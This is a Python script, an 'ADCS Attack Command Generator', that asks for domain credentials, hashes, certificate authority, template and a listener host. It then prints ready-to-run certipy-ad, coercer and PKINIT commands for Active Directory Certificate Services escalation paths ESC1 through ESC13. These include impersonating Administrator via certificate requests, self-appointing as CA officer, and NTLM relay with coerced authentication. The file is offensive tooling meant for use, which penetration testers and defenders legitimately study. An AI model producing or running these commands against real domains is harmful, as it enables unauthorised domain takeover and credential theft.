import sys

def generate_adcs_command(choice, ip, username, password, domain, upn, ca, template, hashes, size, targethttp, LHOST):
    if choice == "ESC1":
        command = f"certipy-ad req -u {username} -p {password} -target {domain} -upn {upn} -ca {ca} -template {template}"
    elif choice == "ESC7":
        commands = [
            f"certipy-ad ca -ca {ca} -add-officer {username} -username {username}@{domain} -p {password}",
            f"certipy-ad ca -ca {ca} -enable-template {template} -username {username}@{domain} -password {password}",
            f"certipy-ad req -ca {ca} -target {domain} -template {template} -upn {upn} -username {username}@{domain} -p {password}",
            f"certipy-ad ca -ca {ca} -issue-request 21 -username {username}@{domain} -p {password}",
            f"certipy-ad req -ca {ca} -target {domain} -retrieve 21 -username {username}@{domain} -p {password}"
        ]
        command = "\n\n".join(commands)
    elif choice == "ESC3":
        commands = [
            f"certipy-ad req -username {username}@{domain} -password {password} -ca {ca} -target {domain} -template {template}",
            f"certipy-ad req -username {username}@{domain} -password {password} -ca {ca} -target {domain} -template {template} -on-behalf-of '{domain}'\'Administrator' -pfx pfx_file"
        ]
        command = "\n\n".join(commands)
    elif choice == "ESC4":
        commands = [
            f"certipy-ad template -username {username}@{domain} -password {password} -template {template} -save-old",
            f"certipy-ad req -username {username}@{domain} -password {password} -ca {ca} -target {domain} -template {template} -upn {upn}"
        ]
        command = "\n\n".join(commands)
    elif choice == "ESC13":
        commands = [
            f"certipy-ad req -u {username} -hashes :{hashes} -ca {ca} -template {template} -dc-ip {ip} -dns {ip} -key-size {size}",
            f"python3 gettgtpkinit.py -cert-pfx pfx_file {domain}/{username} ccache_file -dc-ip {ip} -v"
        ]
        command = "\n\n".join(commands)
    elif choice == "ESC6":
        commands = [
            f"certipy-ad req -username administrator@{domain} -password {password} -ca {ca} -target {domain} -template {template} -upn administrator@{domain}"
        ]
        command = "\n\n".join(commands)
    elif choice == "ESC8":
        commands = [
            f"certipy-ad relay -target {targethttp}",
            f"coercer coerce -u {username}$@{domain} --hashes :{hashes} -l {LHOST} -t {ip} --always-continue",
            f"certipy-ad auth -pfx administrator.pfx"
        ]
        command = "\n\n".join(commands)
    elif choice == "ESC11":
        commands = [
            f"certipy-ad relay -target {targethttp} -ca {ca}"
        ]
        command = "\n\n".join(commands)
    elif choice == "ESC9":
        commands = [
            f"certipy-ad req -username {username}@{domain} -p '{password}' -ca {ca} -template {template}",
            f"certipy-ad account update -username {username}@{domain} -hashes ':{hashes}' -user {username} -upn {upn}"
        ]
        command = "\n\n".join(commands)
    else:
        command = "Invalid choice!"
    return command


def main():
    print("=== ADCS Attack Command Generator ===")
    print("Choose an attack vector:")
    print("1. ESC1")
    print("3. ESC3")
    print("4. ESC4")
    print("6. ESC6")
    print("7. ESC7")
    print("8. ESC8")
    print("9. ESC9")
    print("11. ESC11")
    print("13. ESC13")
    choice_input = input("Enter your choice (1 or 3 or 4 or 7 or 8 or 9 or 11 or 13): ").strip()

    choices = {
        "1": "ESC1",
        "3": "ESC3",
        "7": "ESC7",
        "9": "ESC9",
        "13": "ESC13",
        "4": "ESC4",
        "6": "ESC6", 
        "8" : "ESC8",
        "11" : "ESC11"
    }

    choice = choices.get(choice_input, None)

    if not choice:
        print("Invalid choice. Please restart the program.")
        sys.exit(1)

    
    required_inputs = {
        "ESC1": ["username", "password", "domain", "upn", "ca", "template"],
        "ESC7": ["username", "password", "domain", "upn", "ca", "template"],
        "ESC9": ["username", "password", "domain", "upn", "ca", "template", "hashes"],
        "ESC13": ["username", "hashes", "ca", "template", "ip", "size"],
        "ESC3" : ["username", "domain", "password", "ca", "template"],
        "ESC4" : ["username", "domain", "password", "template", "ca", "upn"],
        "ESC6" : ["domain", "password", "ca", "template"],
        "ESC8" : ["targethttp", "username", "domain", "hashes", "LHOST", "ip"],
        "ESC11" :["targethttp", "ca"]
    }

    inputs = {}
    for field in required_inputs[choice]:
        inputs[field] = input(f"Enter {field}: ").strip()

    command = generate_adcs_command(
        choice,
        inputs.get("ip", ""),
        inputs.get("username", ""),
        inputs.get("password", ""),
        inputs.get("domain", ""),
        inputs.get("upn", ""),
        inputs.get("ca", ""),
        inputs.get("template", ""),
        inputs.get("hashes", ""),
        inputs.get("size", ""),
        inputs.get("targethttp", ""),
        inputs.get("LHOST", "")
    )
    print("\nGenerated Commands:")
    print(command)


if __name__ == "__main__":
    main()
